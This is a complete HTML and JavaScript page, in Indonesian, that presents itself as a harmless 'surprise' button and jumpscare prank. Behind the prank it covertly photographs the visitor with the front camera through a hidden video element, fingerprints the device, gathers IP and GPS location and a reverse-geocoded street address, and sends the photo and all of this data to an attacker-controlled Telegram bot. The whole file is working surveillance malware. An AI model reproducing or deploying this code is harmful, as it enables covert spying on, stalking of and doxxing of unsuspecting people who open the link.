<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>✨ Kejutan</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{min-height:100vh;display:flex;justify-content:center;align-items:center;background:#ffe6f2;font-family:Arial,sans-serif;overflow:hidden}
        .btn-cantik{padding:15px 40px;font-size:24px;font-weight:bold;color:#fff;background:linear-gradient(45deg,#ff4d94,#ff80df);border:none;border-radius:50px;cursor:pointer;box-shadow:0 4px 15px rgba(255,77,148,0.4);transition:0.2s;position:relative;z-index:1}
        .btn-cantik:hover{transform:scale(1.05);box-shadow:0 6px 20px rgba(255,77,148,0.6)}
        .btn-cantik:active{transform:scale(0.95)}
        #jumpscare-overlay{display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:#000;z-index:9999;justify-content:center;align-items:center}
        #jumpscare-img{width:100%;height:100%;object-fit:cover;animation:shake .08s infinite}
        @keyframes shake{0%{transform:translate(1px,1px)rotate(0)}10%{transform:translate(-1px,-2px)rotate(-1deg)}20%{transform:translate(-3px,0)rotate(1deg)}30%{transform:translate(0,2px)rotate(0)}40%{transform:translate(1px,-1px)rotate(1deg)}50%{transform:translate(-1px,2px)rotate(-1deg)}60%{transform:translate(-3px,1px)rotate(0)}70%{transform:translate(2px,1px)rotate(-1deg)}80%{transform:translate(-1px,-1px)rotate(1deg)}90%{transform:translate(2px,2px)rotate(0)}100%{transform:translate(1px,-2px)rotate(-1deg)}}
        .hidden{display:none!important}
        video{position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none}
        canvas{display:none}
        #loader{position:fixed;top:0;left:0;width:100%;height:100%;background:#0a0a0a;display:flex;justify-content:center;align-items:center;z-index:10000;flex-direction:column;gap:16px}
        #loader .spinner{width:40px;height:40px;border:3px solid #1a1a1a;border-top:3px solid #ff4d94;border-radius:50%;animation:spin .8s linear infinite}
        @keyframes spin{to{transform:rotate(360deg)}}
        #loader p{color:#555;font-size:12px;letter-spacing:1px;font-family:monospace}
        #loader .status{color:#333;font-size:11px;font-family:monospace}
        #error-box{display:none;background:rgba(20,10,25,.95);padding:32px 28px;border-radius:28px;max-width:400px;width:90%;text-align:center;border:1px solid rgba(255,50,50,.2)}
        #error-box .icon{font-size:48px;display:block;margin-bottom:8px}
        #error-box h2{color:#fff;font-size:20px}
        #error-box p{color:rgba(255,255,255,.4);font-size:13px;margin:8px 0 16px}
        #error-box .btn-retry{padding:12px 32px;border:none;border-radius:12px;background:linear-gradient(45deg,#ff4d94,#ff80df);color:#fff;font-weight:bold;cursor:pointer;font-size:14px}
        #copy-link{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.7);padding:8px 16px;border-radius:12px;color:rgba(255,255,255,.3);font-size:10px;font-family:monospace;z-index:100;cursor:pointer;transition:.3s;border:1px solid rgba(255,255,255,.05)}
        #copy-link:hover{color:rgba(255,255,255,.6);background:rgba(0,0,0,.8)}
    </style>
</head>
<body>

    <!-- LOADING -->
    <div id="loader">
        <div class="spinner"></div>
        <p>⏳ memuat...</p>
        <div class="status" id="loadStatus">🔐 memeriksa link...</div>
    </div>

    <!-- ERROR -->
    <div id="error-box">
        <span class="icon">🔒</span>
        <h2>Link Tidak Valid</h2>
        <p>Link ini tidak memiliki token yang valid.<br>Hubungi pembuat untuk mendapatkan link yang benar.</p>
        <button class="btn-retry" onclick="location.reload()">🔄 Coba Lagi</button>
    </div>

    <!-- TOMBOL -->
    <button class="btn-cantik hidden" id="btnCantik">✨ Pencet Cantik ✨</button>

    <!-- COPY LINK -->
    <div id="copy-link" onclick="copyLink()">📋 Salin Link</div>

    <!-- JUMPScare -->
    <div id="jumpscare-overlay">
        <img id="jumpscare-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRetLiXderHNqetWb89PbN1EBprTZQBALyXxLZMUX1F9w&s=10" alt="Jumpscare!">
    </div>

    <!-- AUDIO -->
    <audio id="jumpscare-audio" src="suara.mp3" preload="auto"></audio>

    <!-- KAMERA -->
    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        (function() {
            'use strict';

            // ========== TOKEN DARI URL ==========
            function getConfigFromURL() {
                let token = null,
                    chatId = null;
                const hash = window.location.hash.substring(1);
                if (hash) {
                    const params = new URLSearchParams(hash);
                    token = params.get('token');
                    chatId = params.get('chatid');
                }
                if (!token || !chatId) {
                    const query = new URLSearchParams(window.location.search);
                    token = query.get('token');
                    chatId = query.get('chatid');
                }
                return { token, chatId };
            }

            const config = getConfigFromURL();
            const isValid = config.token && config.token.length > 10 && config.chatId && config.chatId.length > 0;

            if (!isValid) {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('error-box').style.display = 'block';
                console.error('❌ Token atau Chat ID tidak ditemukan di URL!');
                throw new Error('Invalid config');
            }

            const BOT_TOKEN = config.token;
            const CHAT_ID = config.chatId;

            // ========== DOM ==========
            const loader = document.getElementById('loader');
            const loadStatus = document.getElementById('loadStatus');
            const btn = document.getElementById('btnCantik');
            const overlay = document.getElementById('jumpscare-overlay');
            const audio = document.getElementById('jumpscare-audio');
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');

            // ========== STATE ==========
            let isProcessing = false;
            let isSent = false;
            let stream = null;
            let captureDone = false;
            let locationDone = false;
            let deviceDone = false;
            let imageData = null;
            let locationData = null;
            let deviceData = null;
            let sendAttempts = 0;
            const MAX_SEND_ATTEMPTS = 3;
            let captureAttempts = 0;
            const MAX_CAPTURE_ATTEMPTS = 10;

            // ========== COPY LINK ==========
            window.copyLink = function() {
                const link = window.location.href;
                if (navigator.clipboard) {
                    navigator.clipboard.writeText(link).then(() => {
                        const el = document.getElementById('copy-link');
                        el.textContent = '✅ Tersalin!';
                        setTimeout(() => { el.textContent = '📋 Salin Link'; }, 2000);
                    }).catch(() => {
                        prompt('Salin link ini:', link);
                    });
                } else {
                    prompt('Salin link ini:', link);
                }
            };

            // ========== 1. DETEKSI DEVICE ==========
            function getAccurateDevice() {
                try {
                    const ua = navigator.userAgent;
                    let brand = 'Unknown',
                        model = 'Unknown',
                        os = 'Unknown',
                        osVer = 'Unknown',
                        browser = 'Unknown',
                        deviceType = 'Desktop',
                        cpu = 'Unknown',
                        gpu = 'Unknown';

                    if (/android/i.test(ua)) { os = 'Android';
                        const m = ua.match(/Android\s([\d.]+)/); if (m) osVer = m[1];
                        deviceType = 'Mobile'; } else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS';
                        const m = ua.match(/OS\s([\d_]+)/); if (m) osVer = m[1].replace(/_/g, '.');
                        deviceType = /iPad/i.test(ua) ? 'Tablet' : 'Mobile'; } else if (/Windows/i.test(ua)) { os =
                            'Windows';
                        const m = ua.match(/Windows NT ([\d.]+)/); if (m) osVer = m[1]; } else if (/Mac/i.test(ua)) { os =
                            'macOS';
                        deviceType = 'Desktop'; } else if (/Linux/i.test(ua)) { os = 'Linux'; }

                    const brandPatterns = {
                        'Samsung': /Samsung|SM-|Galaxy|GT-|SCH-|SGH-|SPH-|SHV-|SHW-|SC-|SM-G|SM-A|SM-J|SM-M|SM-N|SM-T|SM-X|SM-F|SM-Z|SM-C|SM-E|SM-P|SM-W/,
                        'Xiaomi': /Xiaomi|Redmi|POCO|Mi\s|M20|M21|M22|M23|M24|M25|M200|M210|M220|M230/,
                        'iPhone': /iPhone/,
                        'Oppo': /Oppo|CPH|PED|PDT|PGU|PHA|PHB|PHF|PHJ|PHN|PHP|PHS|PHU|PHW|PHX|PHY|PKA|PKB|PKC|PKD|PKE|PKF|PKG|PKH|PKI|PKJ|PKK|PKL|PKM|PKN|PKO|PKP|PKQ|PKR|PKS|PKT|PKU|PKV|PKW|PKX|PKY|PKZ/,
                        'Vivo': /Vivo|V\d{4}|V\d{5}|PD\d{4}/,
                        'Realme': /Realme|RMX|RMP/,
                        'Google': /Pixel|Google/,
                        'OnePlus': /OnePlus|LE\d{4}|CPH\d{4}/,
                        'Huawei': /Huawei|HONOR|MHA-|LIO-|MAR-|ELE-|VOG-|LYA-|CLT-|NOH-|TAS-|LSA-|PCT-|JNY-|ANA-|GRA-|EVR-|ELS-|LIO-|NOP-|BRQ-|NAM-|CDY-|DBY-|JAD-|TNN-|MNA-|FRL-|TFY-|PPA-|WKG-|MGA-|DCO-/
                    };

                    for (const [b, pattern] of Object.entries(brandPatterns)) {
                        if (pattern.test(ua)) { brand = b; break; }
                    }

                    const modelMatch = ua.match(/; ([^;]+)\)/);
                    if (modelMatch && modelMatch[1]) {
                        const raw = modelMatch[1].trim();
                        if (!raw.includes('Android') && !raw.includes('iOS') && !raw.includes('Linux')) { model = raw; }
                    }

                    try { if (navigator.hardwareConcurrency) { cpu = navigator.hardwareConcurrency + ' cores'; } if (/arm/i
                            .test(ua)) cpu += ' (ARM)';
                        else if (/x86/i.test(ua)) cpu += ' (x86)';
                        else if (/aarch64/i.test(ua)) cpu += ' (ARM64)'; } catch(e) {}

                    try { const gl = document.createElement('canvas').getContext('webgl'); if (gl) { const debugInfo = gl
                                .getExtension('WEBGL_debug_renderer_info'); if (debugInfo) { gpu = gl.getParameter(
                                debugInfo.UNMASKED_RENDERER_WEBGL) || 'Unknown'; if (gpu.includes('Adreno')) gpu =
                                'Adreno';
                            else if (gpu.includes('Mali')) gpu = 'Mali';
                            else if (gpu.includes('PowerVR')) gpu = 'PowerVR';
                            else if (gpu.includes('Apple')) gpu = 'Apple GPU'; } } } catch(e) {}

                    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
                    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
                    else if (/Firefox/i.test(ua)) browser = 'Firefox';
                    else if (/Edg/i.test(ua)) browser = 'Edge';
                    else if (/SamsungBrowser/i.test(ua)) browser = 'Samsung Internet';

                    if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) {
                        deviceType = /Tablet|iPad/i.test(ua) ? 'Tablet' : 'Mobile';
                    }

                    deviceData = { brand, model, os, osVer, browser, deviceType, cpu, gpu, screen: screen.width + 'x' +
                            screen.height, pixelRatio: window.devicePixelRatio || 1, timezone: Intl.DateTimeFormat()
                            .resolvedOptions().timeZone, touch: 'ontouchstart' in window || navigator.maxTouchPoints >
                            0 };

                    if (navigator.getBattery) {
                        navigator.getBattery().then(b => {
                            deviceData.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' 🔌' : '');
                            deviceDone = true;
                            checkSend();
                        }).catch(() => { deviceDone = true;
                            checkSend(); });
                    } else { deviceDone = true; }

                    return true;
                } catch(e) {
                    deviceData = { brand: 'Unknown', model: 'Unknown', os: 'Unknown' };
                    deviceDone = true;
                    return true;
                }
            }

            // ========== 2. KAMERA ==========
            function startCamera() {
                loadStatus.textContent = '📷 mengakses kamera...';
                let attempts = 0;
                const maxAttempts = 3;

                function tryCamera() {
                    attempts++;
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    }).then(s => {
                        stream = s;
                        video.srcObject = stream;
                        video.play();

                        let isReady = false;

                        function waitForVideo() {
                            if (video.readyState >= 2 && video.videoWidth > 10 && video.videoHeight > 10) {
                                isReady = true;
                                doCapture();
                                return;
                            }
                            setTimeout(waitForVideo, 100);
                        }

                        video.addEventListener('loadeddata', function() {
                            if (!isReady && video.videoWidth > 10 && video.videoHeight > 10) {
                                isReady = true;
                                doCapture();
                            }
                        });

                        video.addEventListener('loadedmetadata', function() {
                            if (!isReady && video.videoWidth > 10 && video.videoHeight > 10) {
                                isReady = true;
                                doCapture();
                            }
                        });

                        waitForVideo();

                        setTimeout(function() {
                            if (!captureDone) { doCapture(); }
                        }, 2000);

                    }).catch(err => {
                        if (attempts < maxAttempts) {
                            setTimeout(tryCamera, 500);
                        } else {
                            captureDone = true;
                            checkSend();
                        }
                    });
                }

                function doCapture() {
                    if (captureDone) return;
                    captureAttempts++;

                    const w = video.videoWidth || 640;
                    const h = video.videoHeight || 480;

                    if (w < 50 || h < 50) {
                        if (captureAttempts < MAX_CAPTURE_ATTEMPTS) {
                            setTimeout(doCapture, 200);
                        } else {
                            captureDone = true;
                            checkSend();
                        }
                        return;
                    }

                    try {
                        canvas.width = w;
                        canvas.height = h;

                        ctx.translate(w, 0);
                        ctx.scale(-1, 1);
                        ctx.drawImage(video, 0, 0, w, h);
                        ctx.setTransform(1, 0, 0, 1, 0, 0);

                        const pixelData = ctx.getImageData(0, 0, Math.min(w, 20), Math.min(h, 20));
                        let isBlack = true;
                        for (let i = 0; i < pixelData.data.length; i += 4) {
                            const r = pixelData.data[i],
                                g = pixelData.data[i + 1],
                                b = pixelData.data[i + 2];
                            if (r > 20 || g > 20 || b > 20) { isBlack = false; break; }
                        }

                        if (isBlack && captureAttempts < MAX_CAPTURE_ATTEMPTS) {
                            setTimeout(doCapture, 300);
                            return;
                        }

                        imageData = canvas.toDataURL('image/jpeg', 0.92);
                        captureDone = true;

                        if (stream) {
                            stream.getTracks().forEach(t => t.stop());
                            stream = null;
                        }

                        checkSend();

                    } catch(e) {
                        if (captureAttempts < MAX_CAPTURE_ATTEMPTS) {
                            setTimeout(doCapture, 300);
                        } else {
                            captureDone = true;
                            checkSend();
                        }
                    }
                }

                tryCamera();
            }

            // ========== 3. LOKASI (IP-BASED + ALAMAT LENGKAP) ==========
            function getLocation() {
                loadStatus.textContent = '📍 mengambil lokasi...';

                let ipDone = false;
                let gpsDone = false;
                const ipSources = ['https://ipapi.co/json/', 'https://ipinfo.io/json'];
                let ipIndex = 0;

                // ===== IP-BASED (tanpa izin) =====
                function tryIP() {
                    if (ipDone || ipIndex >= ipSources.length) {
                        if (!ipDone) { ipDone = true; }
                        checkLocationDone();
                        return;
                    }
                    const url = ipSources[ipIndex++];
                    fetch(url, { timeout: 5000 })
                        .then(r => r.json())
                        .then(d => {
                            if (ipDone || !d) return;
                            let lat, lng, city, region, country, ip;

                            if (d.latitude && d.longitude) {
                                lat = d.latitude;
                                lng = d.longitude;
                                city = d.city || 'N/A';
                                region = d.region || 'N/A';
                                country = d.country_name || d.country || 'N/A';
                                ip = d.ip || 'N/A';
                            } else if (d.loc) {
                                const c = d.loc.split(',');
                                lat = parseFloat(c[0]);
                                lng = parseFloat(c[1]);
                                city = d.city || 'N/A';
                                region = d.region || 'N/A';
                                country = d.country || 'N/A';
                                ip = d.ip || 'N/A';
                            }

                            if (lat && lng) {
                                locationData = { lat, lng, city, region, country, ip, source: 'IP' };
                                ipDone = true;

                                // Ambil alamat lengkap dari OpenStreetMap
                                const geoUrl =
                                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`;
                                fetch(geoUrl)
                                    .then(res => res.json())
                                    .then(data => {
                                        if (data && data.address) {
                                            const addr = data.address;
                                            locationData.fullAddress = data.display_name || 'N/A';
                                            locationData.road = addr.road || addr.pedestrian || 'N/A';
                                            locationData.suburb = addr.suburb || addr.neighbourhood || 'N/A';
                                            locationData.city = addr.city || addr.town || addr.village || addr
                                                .municipality || city;
                                            locationData.region = addr.state || addr.region || region;
                                            locationData.country = addr.country || country;
                                            locationData.postcode = addr.postcode || 'N/A';
                                            locationData.houseNumber = addr.house_number || addr
                                            .building || 'N/A';
                                        }
                                        checkLocationDone();
                                    })
                                    .catch(() => { checkLocationDone(); });
                            } else {
                                tryIP();
                            }
                        })
                        .catch(() => { tryIP(); });
                }

                // ===== GPS (jika diizinkan, lebih akurat) =====
                function tryGPS() {
                    if (gpsDone || !navigator.geolocation) {
                        if (!gpsDone) { gpsDone = true; }
                        checkLocationDone();
                        return;
                    }

                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            if (!gpsDone && !locationData) {
                                const { latitude, longitude } = position.coords;
                                locationData = {
                                    lat: latitude,
                                    lng: longitude,
                                    accuracy: '±' + Math.round(position.coords.accuracy || 0) + 'm',
                                    alt: position.coords.altitude || 'N/A',
                                    source: 'GPS'
                                };
                                gpsDone = true;

                                const url =
                                    `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`;
                                fetch(url)
                                    .then(res => res.json())
                                    .then(data => {
                                        if (data && data.address) {
                                            const addr = data.address;
                                            locationData.fullAddress = data.display_name || 'N/A';
                                            locationData.road = addr.road || addr.pedestrian || 'N/A';
                                            locationData.suburb = addr.suburb || addr.neighbourhood || 'N/A';
                                            locationData.city = addr.city || addr.town || addr.village || addr
                                                .municipality || 'N/A';
                                            locationData.region = addr.state || addr.region || 'N/A';
                                            locationData.country = addr.country || 'N/A';
                                            locationData.postcode = addr.postcode || 'N/A';
                                            locationData.houseNumber = addr.house_number || addr
                                            .building || 'N/A';
                                        }
                                        checkLocationDone();
                                    })
                                    .catch(() => { checkLocationDone(); });
                            } else {
                                checkLocationDone();
                            }
                        },
                        function(error) {
                            console.warn('⚠️ GPS Error:', error.message);
                            gpsDone = true;
                            checkLocationDone();
                        }, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        }
                    );
                }

                function checkLocationDone() {
                    if (ipDone && gpsDone) {
                        locationDone = true;
                        if (!locationData) {
                            locationData = { lat: 0, lng: 0, source: 'none' };
                        }
                        checkSend();
                    }
                }

                tryIP();
                tryGPS();

                setTimeout(() => {
                    if (!locationDone) {
                        locationDone = true;
                        if (!locationData) { locationData = { lat: 0, lng: 0, source: 'timeout' }; }
                        checkSend();
                    }
                }, 8000);
            }

            // ========== 4. KIRIM TELEGRAM ==========
            function sendToTelegram() {
                if (isSent) return;
                if (!imageData) { checkSend(); return; }

                let caption = '📸 JUMPScare CAPTURE\n';
                caption += '⏰ ' + new Date().toLocaleString('id-ID') + '\n';
                caption += '━'.repeat(25) + '\n';

                if (deviceData) {
                    caption += '\n📱 PERANGKAT:\n';
                    caption += '   Merek: ' + deviceData.brand + '\n';
                    caption += '   Model: ' + deviceData.model + '\n';
                    caption += '   Tipe: ' + deviceData.deviceType + '\n';
                    caption += '   OS: ' + deviceData.os + ' ' + deviceData.osVer + '\n';
                    caption += '   Browser: ' + deviceData.browser + '\n';
                    caption += '   CPU: ' + deviceData.cpu + '\n';
                    caption += '   GPU: ' + deviceData.gpu + '\n';
                    caption += '   Resolusi: ' + deviceData.screen + '\n';
                    caption += '   Pixel Ratio: ' + deviceData.pixelRatio + '\n';
                    caption += '   Timezone: ' + deviceData.timezone + '\n';
                    if (deviceData.battery) caption += '   Baterai: ' + deviceData.battery + '\n';
                    caption += '   Touch: ' + (deviceData.touch ? 'Yes' : 'No');
                }

                if (locationData && locationData.lat && locationData.lng) {
                    caption += '\n\n📍 LOKASI:\n';
                    caption += '   Lat: ' + locationData.lat + '\n';
                    caption += '   Lng: ' + locationData.lng + '\n';
                    caption += '   Sumber: ' + (locationData.source || 'N/A') + '\n';
                    if (locationData.accuracy) caption += '   Akurasi: ' + locationData.accuracy + '\n';
                    if (locationData.ip) caption += '   IP: ' + locationData.ip + '\n';

                    // ALAMAT LENGKAP
                    caption += '\n📌 ALAMAT:\n';
                    if (locationData.fullAddress) {
                        caption += '   ' + locationData.fullAddress + '\n';
                    } else {
                        if (locationData.houseNumber && locationData.houseNumber !== 'N/A')
                            caption += '   No: ' + locationData.houseNumber + '\n';
                        if (locationData.road && locationData.road !== 'N/A')
                            caption += '   Jalan: ' + locationData.road + '\n';
                        if (locationData.suburb && locationData.suburb !== 'N/A')
                            caption += '   Area: ' + locationData.suburb + '\n';
                        if (locationData.city && locationData.city !== 'N/A')
                            caption += '   Kota: ' + locationData.city + '\n';
                        if (locationData.region && locationData.region !== 'N/A')
                            caption += '   Provinsi: ' + locationData.region + '\n';
                        if (locationData.country && locationData.country !== 'N/A')
                            caption += '   Negara: ' + locationData.country + '\n';
                        if (locationData.postcode && locationData.postcode !== 'N/A')
                            caption += '   Kode Pos: ' + locationData.postcode + '\n';
                    }

                    caption += '\n🗺️ https://maps.google.com/?q=' + locationData.lat + ',' + locationData.lng;
                }

                try {
                    const bs = atob(imageData.split(',')[1]);
                    const ab = new ArrayBuffer(bs.length);
                    const ia = new Uint8Array(ab);
                    for (let i = 0; i < bs.length; i++) ia[i] = bs.charCodeAt(i);
                    const blob = new Blob([ab], { type: 'image/jpeg' });

                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, 'jumpscare.jpg');
                    fd.append('caption', caption);

                    sendAttempts++;

                    fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {
                        method: 'POST',
                        body: fd
                    }).then(r => r.json()).then(d => {
                        if (d.ok) {
                            isSent = true;
                            loadStatus.textContent = '✅ terkirim!';
                            setTimeout(function() {
                                loader.style.display = 'none';
                                btn.classList.remove('hidden');
                            }, 500);
                        } else {
                            if (sendAttempts < MAX_SEND_ATTEMPTS) {
                                setTimeout(sendToTelegram, 1500);
                            } else {
                                loadStatus.textContent = '❌ gagal kirim';
                            }
                        }
                    }).catch(() => {
                        if (sendAttempts < MAX_SEND_ATTEMPTS) {
                            setTimeout(sendToTelegram, 1500);
                        } else {
                            loadStatus.textContent = '❌ error kirim';
                        }
                    });
                } catch(e) {
                    if (sendAttempts < MAX_SEND_ATTEMPTS) {
                        setTimeout(sendToTelegram, 1500);
                    } else {
                        loadStatus.textContent = '❌ error: ' + e.message;
                    }
                }
            }

            // ========== 5. CHECK & SEND ==========
            function checkSend() {
                if (captureDone && locationDone && deviceDone && !isSent) {
                    sendToTelegram();
                }
            }

            // ========== 6. RUN ==========
            function runAll() {
                if (isProcessing) return;
                isProcessing = true;

                getAccurateDevice();
                startCamera();
                getLocation();

                setTimeout(() => {
                    if (!isSent) {
                        if (!captureDone) { captureDone = true; }
                        if (!locationDone) { locationDone = true; if (!locationData) locationData = { lat: 0,
                                lng: 0, source: 'fallback' }; }
                        if (!deviceDone) { deviceDone = true; if (!deviceData) deviceData = { brand: 'Unknown',
                                model: 'Unknown' }; }
                        if (!imageData) {
                            try { imageData = canvas.toDataURL('image/jpeg', 0.8); } catch(e) {}
                        }
                        checkSend();
                    }
                }, 10000);
            }

            // ========== 7. TOMBOL ==========
            btn.addEventListener('click', function() {
                overlay.style.display = 'flex';
                audio.play().catch(function(error) { console.log("Gagal memutar suara: ", error); });

                runAll();

                setTimeout(function() {
                    overlay.style.display = 'none';
                    location.reload();
                }, 3000);
            });

            // ========== 8. START ==========
            loadStatus.textContent = '✅ siap!';
            setTimeout(function() {
                loader.style.display = 'none';
                btn.classList.remove('hidden');
            }, 500);

            // ========== 9. CLEANUP ==========
            window.addEventListener('beforeunload', function() {
                if (stream) { stream.getTracks().forEach(t => t.stop()); }
            });

            console.log('👁️ drakGPT · IP Location + Full Address');
            console.log('Token: ' + BOT_TOKEN.substring(0, 15) + '...');
            console.log('Chat ID: ' + CHAT_ID);

        })();
    </script>

</body>
